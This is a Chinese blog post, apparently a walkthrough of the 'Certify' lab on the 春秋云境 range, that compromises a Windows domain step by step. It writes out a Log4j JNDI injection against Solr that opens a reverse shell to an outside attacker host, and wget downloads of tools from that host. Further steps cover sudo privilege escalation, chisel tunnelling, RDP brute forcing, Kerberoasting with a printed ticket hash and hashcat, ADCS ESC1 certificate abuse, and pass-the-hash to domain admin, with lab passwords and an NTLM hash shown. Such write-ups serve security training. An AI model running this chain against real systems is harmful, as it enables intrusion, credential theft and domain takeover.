@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    <title>春秋云境-Certify | T1ng的摆烂日常</title>
+    
+    
+        <meta property="og:site_name" content="T1ng的摆烂日常">
+    
+    
+        <meta property="article:author" content="T1ng">
+    
+    
+        <link rel="icon" href="/img/t1ng.ico">
+    
+    
+<link rel="stylesheet" href="/css/minireset.min.css">
+
+    
+<link rel="stylesheet" href="/css/all.min.css">
+
+    
+<link rel="stylesheet" href="/css/csshake.min.css">
+
+    
+<link rel="stylesheet" href="/css/hljs/lioshi.css">
+
+    
+<link rel="stylesheet" href="/css/jquery.fancybox.min.css">
+
+    
+<link rel="stylesheet" href="/styl/main.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/highlight.min.js"></script>
+
+    
+<script src="/js/jquery.fancybox.min.js"></script>
+
+    
+<script src="/js/clipboard.min.js"></script>
+
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <header>
+  <div class="outer">
+    <div class="inner">
+      <h1 class="logo-wrap">
+        <a>T1ng的摆烂日常<b><sup></sup></b></a>
+      </h1>
+    </div>
+    <div class="inner">
+      <nav class="main-nav">
+        
+          
+            <a href="/">首页</a>
+          
+        
+          
+            <a href="/archives">归档</a>
+          
+        
+          
+            <a href="/categories">分类</a>
+          
+        
+          
+            <a href="/tags">标签</a>
+          
+        
+          
+            <a href="/friends">友链</a>
+          
+        
+          
+            <div class="dropdown">
+              <a class="dropbtn">相关链接</a>
+              <div class="dropdown-content">
+                
+              </div>
+            </div>
+          
+        
+          
+            <a href="/about">关于</a>
+          
+        
+      </nav>
+    </div>
+  </div>
+</header>
+    <div class="content">
+        <section class="outer">
+    <article>
+        <div class="article-title">
+    <h2>
+        <a href="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/" class="shake shake-little" title="春秋云境-Certify">
+            
+            春秋云境-Certify
+        </a>
+    </h2>
+    <div class="meta_box">
+    
+        
+        
+            
+                
+        
+        <div class="meta meta_auth">
+            <img src="/img/t1ng.png" alt="head" />
+            <p>t1ng</p>
+        </div>
+    
+        
+        
+        <div class="meta meta_date">
+            <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+            <p>发布于：2025年03月10日</p>
+        </div>
+    
+        <div class="meta meta_update">
+            <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+            <p>更新于：2025年03月10日</p>
+        </div>
+    </div>
+    
+  <div class="post_tags">
+    <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/" rel="tag"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>春秋云境</a></li></ul>
+  </div>
+
+
+</div>
+
+        <hr>
+        <div class="article-entry">
+            
+            
+            
+            <h3><span id="信息收集">信息收集</span></h3><p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/faa9a9d78532f934783a89558ef55a61.png"></p>
+<p>发现<code>Solr Admin</code>框架，访问网站，<br><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/fb68edf242eb14dc85b933f7b43fcdbf.png"><br>发现<code>Log4j</code>插件，<code>DNSlog</code>测试出可以打<code>Log4j</code>的RCE。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/solr/admin/collections?action=$&#123;jndi:ldap://0pzyoq.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/33e7d64c231788c3d3b2dbdd3f0962bd.png"><br> <code>JNDI</code>反弹shell，监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.98.107.27:8983/solr/admin/collections?action=$&#123;jndi:ldap://47.79.41.42:1389/Basic/ReverseShell/47.79.41.42/9001</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@s35173:~# java -jar JNDIExploit.jar -i 47.79.41.42</span><br><span class="line">[+] LDAP Server Start Listening on 1389...</span><br><span class="line">[+] HTTP Server Start Listening on 3456...</span><br><span class="line">[+] Received LDAP Query: Basic/ReverseShell/47.79.41.42/9001</span><br><span class="line">[+] Paylaod: reverseshell</span><br><span class="line">[+] IP: 47.79.41.42</span><br><span class="line">[+] Port: 9001</span><br><span class="line">[+] Sending LDAP ResourceRef result for Basic/ReverseShell/47.79.41.42/9001 with basic remote reference payload</span><br><span class="line">[+] Send LDAP reference result for Basic/ReverseShell/47.79.41.42/9001 redirecting to http://47.79.41.42:3456/ExploitoCciamotto.class</span><br><span class="line">[+] New HTTP Request From /39.98.107.27:57214  /ExploitoCciamotto.class</span><br><span class="line">[+] Receive ClassRequest: ExploitoCciamotto.class</span><br><span class="line">[+] Response Code: 200</span><br><span class="line"></span><br><span class="line">root@s35173:~# nc -lnvp 9001</span><br><span class="line">Listening on 0.0.0.0 9001</span><br><span class="line">Connection received on 39.98.107.27 56706</span><br><span class="line">bash: cannot set terminal process group (17155): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/c4052d9ee0d2ef6a0dd347f0677f5269.png"><br><code>sudo grc</code>提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/grc --pty /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/facb83b65a2c79430ee31019b484b963.png"><br>将<code>chisel</code>和<code>fscan</code>上传到vps，vps上启动python的web服务。在shell中使用<code>wget</code>下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://47.79.41.42:12345/fscan</span><br><span class="line">wget http://47.79.41.42:12345/chisel</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/45562e0cb0b0d2e4c165ad7e9fce9c7d.png"><br><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/6b1ef3b6e99c026fbfb7bddf97c175ec.png"><br><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/1ec4760cad917638902369e830e4f2e6.png"><br>查看网段，为接下来使用<code>fscan</code>确认好目标</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/3dba644351ca74aebbbeda08dc7a36ac.png"><br>给<code>fscan</code>和<code>chisel</code>执行权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 fscan</span><br><span class="line">chmod 777 chisel</span><br></pre></td></tr></table></figure>
+
+<p>查看网段内的主机和开启端口服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.9.0/24    </span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.9.19     is alive</span><br><span class="line">(icmp) Target 172.22.9.26     is alive</span><br><span class="line">(icmp) Target 172.22.9.7      is alive</span><br><span class="line">(icmp) Target 172.22.9.47     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.9.7:80 open</span><br><span class="line">172.22.9.47:80 open</span><br><span class="line">172.22.9.47:22 open</span><br><span class="line">172.22.9.47:21 open</span><br><span class="line">172.22.9.19:80 open</span><br><span class="line">172.22.9.19:22 open</span><br><span class="line">172.22.9.47:445 open</span><br><span class="line">172.22.9.7:445 open</span><br><span class="line">172.22.9.26:445 open</span><br><span class="line">172.22.9.7:139 open</span><br><span class="line">172.22.9.26:139 open</span><br><span class="line">172.22.9.47:139 open</span><br><span class="line">172.22.9.7:135 open</span><br><span class="line">172.22.9.26:135 open</span><br><span class="line">172.22.9.7:88 open</span><br><span class="line">172.22.9.19:8983 open</span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx!</span><br><span class="line">[*] WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] NetBios 172.22.9.7      [+] DC:XIAORANG\XIAORANG-DC    </span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.9.7</span><br><span class="line">   [-&gt;]XIAORANG-DC</span><br><span class="line">   [-&gt;]172.22.9.7</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.9.26</span><br><span class="line">   [-&gt;]DESKTOP-CBKTVMO</span><br><span class="line">   [-&gt;]172.22.9.26</span><br><span class="line">[*] NetBios 172.22.9.47     fileserver                          Windows 6.1</span><br><span class="line">[*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] OsInfo 172.22.9.47  (Windows 6.1)</span><br><span class="line">[*] WebTitle http://172.22.9.19:8983   code:302 len:0      title:None 跳转url: http://172.22.9.19:8983/solr/</span><br><span class="line">[+] PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect </span><br><span class="line">[*] WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin</span><br><span class="line">已完成 15/16 [-] ftp 172.22.9.47:21 ftp ftp123 530 Login incorrect. </span><br><span class="line">已完成 16/16</span><br><span class="line">[*] 扫描结束,耗时: 1m27.850362197s</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">172.22.9.7 # DC  XIAORANG\XIAORANG-DC</span><br><span class="line">172.22.9.13:CA</span><br><span class="line">172.22.9.19 # 本机 </span><br><span class="line">172.22.9.26 # DESKTOP-CBKTVMO.xiaorang.lab </span><br><span class="line">172.22.9.47 # Ubuntu fileserver</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>chisel</code>内网穿透，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./chisel client 47.121.122.139:9001 R:0.0.0.0:9002:socks</span><br><span class="line">./chisel server -p 9001 --reverse</span><br></pre></td></tr></table></figure>
+
+<p>kali虚拟机设置<code>proxychains4</code>代理,smb远程连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 smbclient -L 172.22.9.47</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/4539826c88e545d68975e4d800744afc.png"><br>进入共享文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 smbclient \\\\172.22.9.47\\fileshare</span><br></pre></td></tr></table></figure>
+
+<p>此时顺便将数据库文件get下来<br><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/630a88b8ac9b7c0286ed261b785f7e61.png"><br>拿到flag02<br><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/fc5215291dbbbcc19a791d5902080ac6.png"></p>
+<p>查看数据库文件<br><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/46dd71a6316a39c416e66a31af95646c.png"><br>用户名未知，导出user，利用user进行rdp爆破，尝试远程登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains hydra -L user.txt -P passwd.txt 172.22.9.26 rdp -vV -e ns</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zhangjian@xiaorang.lab:i9XDE02pLVf </span><br><span class="line">liupeng@xiaorang.lab:fiAzGwEMgTY</span><br></pre></td></tr></table></figure>
+
+<p>尝试登录，但是失败，根据flag02提示，查一下用户的SPN</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/05f0e064f5a16ae8889f280f1125468b.png"><br>请求<code>zhangxia</code>用户的<code>TGS Tickets</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> proxychains4 python GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf -request-user zhangxia</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Impacket v0.13.0.dev0+20250220.93348.6315ebd5 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  47.121.122.139:9002  ...  172.22.9.7:389  ...  OK</span><br><span class="line">ServicePrincipalName                   Name      MemberOf  PasswordLastSet             LastLogon                   Delegation </span><br><span class="line">-------------------------------------  --------  --------  --------------------------  --------------------------  ----------</span><br><span class="line">TERMSERV/desktop-cbktvmo.xiaorang.lab  zhangxia            2023-07-14 00:45:45.213944  2025-03-10 09:15:03.038277             </span><br><span class="line">WWW/desktop-cbktvmo.xiaorang.lab/IIS   zhangxia            2023-07-14 00:45:45.213944  2025-03-10 09:15:03.038277             </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[proxychains] Strict chain  ...  47.121.122.139:9002  ...  172.22.9.7:88  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  47.121.122.139:9002  ...  172.22.9.7:88  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  47.121.122.139:9002  ...  172.22.9.7:88  ...  OK</span><br><span class="line">$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$f85d248237fa78354a4ce81df9676376$e2a19de4dfe14a160053390528fb66535bd34006ff68cbaa432f0eadb82a263969af5faf11f6d5645180afeff9df456545a688f602d2900d84164d68297a92d4df66c23fe76903c7414ebdbb38dc50493dd8766e45da5e798250aaf86fdb99279609e142d1d80693175c7d823df7b21f322e1d4f1272de52656f56e2d85673a7b6c4de5d0bc622a2bacb330a9d1e197e1e30ad4acfee1c89742a8cc00638de6fd899cf971587c7d63b7d79911762899c9b7116d6e04696b03802fead84ed127c2d4fcc2c0965e634572e1003b55891a3cb1724a79811b863745014068e7d885cdbc1031611f63cafd02cfcf19e650fd3972703bf1513e2d6adc543be908c012bdfd91914052f1a07342ec9c6f90f76380cb817f434f5321b587f336b4e3af4c1f8cee812097493da58bea89d9762d08f09d40f90a1ad7c515ac5a69be4629b6faa59228ba95b4fd2eb81fa6cb91ec8521a641a5cbe2fb19e0c17950340c79620760ee34dc0211e70a25692159dd2525bb3eed643feaec46cd35357246920a44df06e62730dcb36127b66710b9dd6bb4d31df6311d5120fbe45e35d49ddaa5aaac4813aad91cac027153d3ed7fc44892c059656a2b7fb1ebcca6c2732af08745d25df44911fea3b0549f3f430dbcb0193094e50dde035625df8b6566e491cd02ec8b2981870e7f49b2308a0a5b5bdcca39e00a2d23efedd2e3130307a17a891cce53e6f0a5e4f174a078ff8c53a0542a5ba18c437e0781c92fba1bcfc1e5413b3a8b162d945d9a50c361eb86bb75bb62be6e0d366102e4fdf2140e2a525e4040612544fb7d2a3636886b97413c141a4fbcc70d06763e12d53ee438a05042896020b96a183841a3515e27d7ac99052b64b6cea68bdf85437abb7c4a384ecc144066274afbf91598584d15d25ff2f468835e2aed5c05da7998407207a1483859f1933aa58e3e26826670f1685ffb11017c1cca627a81a5403ced81827f4a8a6aded342d9cc674c97b672a2f5b0ee60f01959da32783c72677a5215ed04a4e09c25ece02312bb07c96b9209ad7907e6bd72e2001b83681bb109a947417ef13ec4b452f7f2d0bde89b012757214fb716bd049661312cc812a490445bbdd3ee346bf791289822d7062a10480cb9a4689f9e93db7c2bb92158c61d59411a2a2054659fd758c3773500744e413689d0785779f520a90eaf313a57f1ee2d643419be99078a75135330ed1a1686236f1be9dcf72163264ab2e90cdf61bce7aac5202a982a0e8b9083bb5ce135921daab0f5b51c4d433987bf47c039c48c118658056c59c84ccf3d32a02a6cdd14447273d14889896b412683d4b69e0e7bd4923f9e963904ffe99cf81ea1dd1b607eda71b6bae59a0dbf857f4e141a1d7abfe437f702750bac90de1c38535ec856c3513e65f9d634186748648c38f9ce769b39c9b9ac7b05e93523f1b263923af1c8d7d32980b61264d7f03f4b8345623739ea6d37a8e273a01d94930e8dcc8a21aaf0071614b</span><br></pre></td></tr></table></figure>
+
+<p>过呢据前面的格式且在<code>TGS REP</code>过程，参数为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol</span><br></pre></td></tr></table></figure>
+
+<p>hashcat爆一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 13100 1.txt rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/1fa6de941fd75c3c9955c194bc1e5fdf.png"><br>尝试进行rdp登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 xfreerdp /v:172.22.9.26 /u:XIAORANG.LAB\\zhangxia /p:MyPass2@@6 /sec:credsspd</span><br></pre></td></tr></table></figure>
+
+<p>登录以后发现是域账号（最低权限），登陆后不能访问administrator目录查找flag。<br>查看证书情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad find -u &#x27;zhangxia@xiaorang.lab&#x27;  -password &#x27;MyPass2@@6&#x27; -dc-ip 172.22.9.7 -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/4cc8d0efa033103745e2929d658eb6df.png"><br>修改<code>/etc/hosts</code>，避免超时</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.22.9.13 CA01.xiaorang.lab</span><br></pre></td></tr></table></figure>
+
+<p>利用<code>ESC1</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad req -u &#x27;zhangxia@xiaorang.lab&#x27; -p &#x27;MyPass2@@6&#x27; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &#x27;xiaorang-XIAORANG-DC-CA&#x27; -template &#x27;XR Manager&#x27; -upn &#x27;administrator@xiaorang.lab&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/b7d6738aeb35ae7bfa29c1b7a535c591.png"><br>再拿生成的administrator.pfx获取域管哈希</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/a03e7b087c5978eff420cdb7e087f055.png"><br>pth传递拿到域管理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.26</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/50e86656d42e34e1f49242cdbef18238.png"><br>读取flag03</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type c:\users\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/213dc87ec744dd14142e5847b0ffcf71.png"><br>通过域控哈希拿其他主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7</span><br></pre></td></tr></table></figure>
+
+<p>读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type c:\users\administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/3bbc2752a81603c39cc539ff01bd848d.png"></p>
+
+            <div class="article-copyright">
+                
+
+            </div>
+        </div>
+    </article>
+    
+
+    <section id="toc-div" >
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">信息收集</span></a></li></ol>
+    </section>
+    <section id="gohome" style="display: none;"><a><i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i></a></section>
+
+
+</section>
+    </div>
+    <footer>
+    <div class="outer">
+        <div class="inner">
+            Powered by <a href="https://github.com/hdxw/hexo-theme-prowiki" target="_blank">ProWiki</a>
+            &copy;2025 t1ng<br>
+            <a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/"></a>
+            <div style="height: 50px;"></div>
+
+            <!-- 不蒜子统计信息 -->
+            <div id="busuanzi_container">
+                <span id="busuanzi_value_site_uv"></span> 访客 | 
+                <span id="busuanzi_value_site_pv"></span> 访问量
+            </div>
+
+            <!-- 不蒜子脚本 -->
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        </div>
+    </div>
+</footer>
+
+<script src="/js/custom.js"></script>
+
+
+    <script>onload_content();</script>
+
+</body>
+</html>
